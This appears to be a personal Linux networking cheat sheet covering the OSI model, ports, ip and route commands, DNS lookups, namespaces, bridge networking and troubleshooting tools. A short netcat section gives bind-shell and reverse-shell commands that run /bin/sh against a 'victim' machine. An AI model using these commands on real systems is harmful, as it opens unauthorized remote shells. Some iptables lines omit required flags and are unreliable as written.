## Networking

### OSI vs TCP/IP

```
Application	| (Communicationg with applications)
-----------------
Presentation	| (Encryption, compression)
----------------- Application
Session		| (Create and maintain session)
------------------------------
Transport	| Transport (Choosing protocol TCP/ UDP)
------------------------------
Network		| Internet (Routing traffic over IP address)
------------------------------
DataLink	| (Dealing with MAC Addresses)
----------------- Network Access
Physical	| (Physical transmission of Data)
------------------------------
```
### Ports
```bash
SSH		22
HTTP/S		80/443
FTP		20/21
TELNET		23
SMTP		25
ICMP
DNS		53
DHCP		67/68
RDP		3389
```

```
Object		Abbreviated form	Purpose
-------		----------------	--------
link		l			Network device
----------------------------------------------------------------------------------------------
address		a
		addr			Protocol (IP or IPv6) address on a device.
----------------------------------------------------------------------------------------------
addrlabel	addrl			Label configuration for protocol address selection.
----------------------------------------------------------------------------------------------
neighbour	n
		neigh			ARP or NDISC cache entry.
----------------------------------------------------------------------------------------------
route		r			Routing table entry.
----------------------------------------------------------------------------------------------
rule		ru			Rule in routing policy database.
----------------------------------------------------------------------------------------------
maddress	m
		maddr			Multicast address.
----------------------------------------------------------------------------------------------
mroute		mr			Multicast routing cache entry.
----------------------------------------------------------------------------------------------
tunnel		t			Tunnel over IP.
----------------------------------------------------------------------------------------------
xfrm		x			Framework for IPsec protocol.
----------------------------------------------------------------------------------------------
```

### Ports
```bash
$ cat /etc/services
```

### Link

```bash
# view network interfaces on host
$ ip link
# set up a network device
$ ip link set eth1 up
# down a network device
$ ip link set eth1 down
# configure network interfaces
# vim /etc/sysconfig/network-scripts/ifcfg-<device>
$ vim /etc/sysconfig/network-scripts/ifcfg-eth0
```

### Ip address

```bash
# list network details
$ ip addr show
# show for a particular interface
$ ip addr show dev eth0
# assign ip address, dev --> device
$ ip addr add 192.168.50.5/24 dev eth1
# remove an ip address
$ ip addr del 192.168.50.5/24 dev eth1
# enable a network interface
$ ip link set eth1 up
# disable a network interface
$ ip link set eth1 down
```

### Route tables

```bash
# show route tables
$ ip route show
# or
$ route -n
# add static route
$ ip route add 10.10.20.0/24 via 192.168.50.100 dev eth0
# remove static route
$ ip route del 10.10.20.0/24
# add default gateway
$ ip route add default via 192.168.50.100

# configuration for eth-0
$ cat /etc/sysconfig/network-scripts/ifcfg-eth0
```

### DNS

```
Local Cache --> Router --> Recurssive DNS (by ISP) --> 
ROOT Level Domain --> TOP Level Domain --> Authoritative NS --> A Record
```
```bash
# modify host file
$ echo "xxx.xxx.xxx.xx server-name" >> /etc/hosts
# view dns server settings
$ cat /etc/resolv.conf
# set up dns
$ echo "nameserver xxx.xxx.xxx.xxx" >> /etc/resolv.conf
$ echo "nameserver 8.8.8.8" >> /etc/resolv.conf
```
#### DNS debug
nslookup
```bash
$ nslookup www.google.com
# nslookup using a specific name server
$ nslookup example.com ns1.nsexample.com
# nslookup using type
$ nslookup -type=soa example.com
```
dig
```
$ dig www.google.com
$ dig www.google.com A 		# IPv4
$ dig www.google.com AAAA 	# IPv6
$ dig www.google.com NS		# Name Server
$ dig @8.8.8.8 www.google.com	# Use a specific DNS server
$ dig -x 8.8.8.8		# Reverse lookup
```
traceroute 

Prints the n/w hop taken to resolve the dns. It figures it out by sending packets with incremental TTL
```
$ traceroute www.google.com
```
netcat

Bind shell

When you can exploit any port of the victom machine
```bash
# On the target, run ncat as server
$ ncat -lvp 3334 -e /bin/sh
# On the attack machine
$ ncat <ip_address> <port> 
```
Reverse shell

When you can gain entry to one open port but can't use that port as its already being used.
```bash
# On the attack box
$ ncat -lvp 3334
# On the target machine, start as client as send the shell program over
$ ncat <ip_address> <port> -e /bin/sh
```
### Namespaces

```bash
# list all namespaces
$ ip netns list
# add a new namespace, creates a network isolation
$ ip netns add red
# remove a namespace
$ ip netns delete red
# ping from a namespace
$ ip netns exec red ping xxx.xxx.xxx.xxx
# show route
$ ip netns exec red route
# arp
$ ip netns exec red arp
$ ip netns exec blue arp
```

### Setting up bridge network

Refer - https://ops.tips/blog/using-network-namespaces-and-bridge-to-isolate-servers/

- Create two namespaces to setup network isolation

```bash
# create two namespaces red, blue
$ ip netns add red
$ ip netns add blue
# show
$ ip link
$ ip netns exec red ip link
$ ip netns exec blue ip link
```

- Setup a bridge network
  *Interface for the host and switch to the namespaces

```bash
# setup a bridge network
$ ip link add v-net-0 type bridge
# bring the interface up
$ ip link set dev v-net-0 up
# assign ip address to the bridge and set broadcast address
$ ip addr add 192.168.15.5/24 brd + dev v-net-0
```

- Create virtual network interfaces

```bash
# create two virtual cables
$ ip link add veth-red type veth peer name veth-red-br
$ ip link add veth-blue type veth peer name veth-blue-br
```

- Attach the virtual interfaces and assign ip address

* For red network

```bash
# attach virtual cables to red host and bridge
$ ip link set dev veth-red netns red
$ ip link set dev veth-red-br master v-net-0
# assing ip address
$ ip -n red addr add 192.168.15.1 dev veth-red
# turn the device up
$ ip -n red link set dev veth-red up
$ ip link set dev veth-red-br up
```

- For blue network

```bash
# attach virtual cables to blue host and bridge
$ ip link set veth-blue netns blue
$ ip link set veth-blue-br master v-net-0
# assing ip address
$ ip -n blue addr add 192.168.15.2 dev veth-blue
# turn the device up
$ ip -n blue link set veth-blue up
$ ip link set dev veth-blue-br up
```

- Add NAT

```bash
iptables -t nat POSTROUTING -s 192.168.15.0/24 -j MASQUERADE
```

- Add Default gateway (set default gateway to the ip address of the bridge)

```bash
ip netns exec red ip route add default via 192.168.15.5
ip netns exec blue ip route add default via 192.168.15.5
```

- Add port forward

```bash
iptables -t nat PREROUTING --dport 80 --to-destination 192.168.15.2:80 -j DNAT
```
#### Troubleshooting Network Issues

```bash
# if icmp is enabled check if host is reachable
$ ping -c google.com

# troubleshoot dns issues
$ traceroute -n google.com
$ tracepath -n google.com

# netstat
# -n --> numerical address and ports
# -i --> list of network interfaces
# -r --> route table
# -p --> pid and program used
# -l --> listening socket

# display route table
$ netstat -rn

# display listening socket (tcp), eg. check if nginx is listening on port 80
$ netstat -ntlp
# for udp
$ netstat -nulp
# List open files (as everything in linux is files, this displays whats running on a port)
$lsof -i tcp:3000

# packet sniffing using tcpdump
# -n --> numerical address and ports
# -A --> display ASCII output
# -v --> verbose
# -vvv --> even more verbose
$ tcpdump

# telnet --> check port open and listening on remote server
$ telnet google.com 80

# port scan
$ nmap www.server.com
```
